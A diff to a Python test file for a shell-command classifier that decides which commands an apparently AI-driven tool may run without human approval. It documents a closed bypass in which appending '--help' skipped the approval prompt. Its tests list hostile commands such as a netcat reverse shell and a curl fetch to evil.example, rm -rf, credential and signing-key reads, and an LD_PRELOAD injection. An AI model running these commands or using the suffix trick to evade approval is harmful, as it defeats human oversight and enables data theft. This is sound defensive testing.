@@ -90,6 +90,63 @@ class TestIsReadOnlyBash:
         assert is_read_only_bash("java -version") is True
         assert is_read_only_bash("some-tool --help") is True
 
+    def test_help_probe_allows_one_bare_subcommand(self):
+        """`<program> <subcommand> --help` is still a usage probe."""
+        assert is_read_only_bash("git log --help") is True
+        assert is_read_only_bash("git rev-parse --help") is True
+        assert is_read_only_bash("terraform plan --help") is True
+        assert is_read_only_bash("cargo --version") is True
+
+    def test_help_suffix_does_not_auto_approve_an_arbitrary_command(self):
+        """A trailing `--help` must not vouch for the command in front of it.
+
+        The classifier used to accept any segment whose first pipe element
+        ended with `--help`/`--version`, so appending the token removed the
+        human approval prompt for arbitrary commands. A shell hands `--help`
+        to the script as $1 instead of printing usage, so the payload still
+        ran.
+        """
+        # Interpreters: the operand is code, and it executes.
+        assert is_read_only_bash("sh /tmp/payload.sh --help") is False
+        assert is_read_only_bash("bash /tmp/payload.sh --version") is False
+        assert is_read_only_bash("/bin/sh /tmp/x.sh --help") is False
+        assert is_read_only_bash("./sh evil.sh --help") is False
+        assert is_read_only_bash("python -c \"import os;os.system('id')\" --help") is False
+        # Destructive operands.
+        assert is_read_only_bash("rm -rf ./proj --help") is False
+        assert is_read_only_bash("chmod 777 /etc/passwd --help") is False
+        # Wrappers that hand off to another program.
+        assert is_read_only_bash("sudo rm -rf / --help") is False
+        assert is_read_only_bash("env sh evil.sh --help") is False
+        assert is_read_only_bash("xargs rm --help") is False
+        assert is_read_only_bash("docker run --rm alpine --help") is False
+        # Network tools: the operand opens a connection.
+        assert is_read_only_bash("nc evil.example 4444 -e /bin/sh --help") is False
+        assert is_read_only_bash("curl http://evil.example/x.sh --help") is False
+
+    def test_help_suffix_does_not_auto_approve_across_segments(self):
+        """Every `&&`/`;` segment is classified, so the suffix cannot chain.
+
+        These are the payloads that combined the suffix with a sensitive-path
+        read or a write to the deny-rule keystone file.
+        """
+        assert is_read_only_bash("cd ~/.kiro/crew --help && cat token_signing.key --help") is False
+        assert (
+            is_read_only_bash("cd ~/.kiro/crew --help && tee denied_commands.json --help") is False
+        )
+        assert is_read_only_bash("V=$HOME --help; awk 1 $V/.aws/credentials --help") is False
+
+    def test_help_probe_rejects_unparseable_and_prefixed_forms(self):
+        """Deny-by-default when argv cannot be recovered or is not a probe."""
+        # Unbalanced quote: argv is unknown, so the segment is not vouched for.
+        assert is_read_only_bash('some-tool "--help') is False
+        # A VAR=value prefix assigns into the command's environment.
+        assert is_read_only_bash("LD_PRELOAD=/tmp/x.so --help") is False
+        # More than one operand between program and flag.
+        assert is_read_only_bash("npm run deploy --help") is False
+        # An option, not a bare subcommand, in the middle.
+        assert is_read_only_bash("some-tool -f /etc/shadow --help") is False
+
     def test_compound_read_commands(self):
         assert is_read_only_bash("git status && git log --oneline -3") is True
         assert is_read_only_bash("ls -la; echo done") is True
@@ -112,9 +169,7 @@ class TestIsReadOnlyBash:
         assert is_read_only_bash("ls -la 2>&1") is True
         # Compound + pipe chains with a /dev/null sink stay read-only.
         assert is_read_only_bash("grep -r foo . 2>/dev/null | head -20") is True
-        assert (
-            is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True
-        )
+        assert is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True
 
     def test_devnull_does_not_unlock_write_commands(self):
         """The /dev/null exemption must not allowlist a write/exec command."""
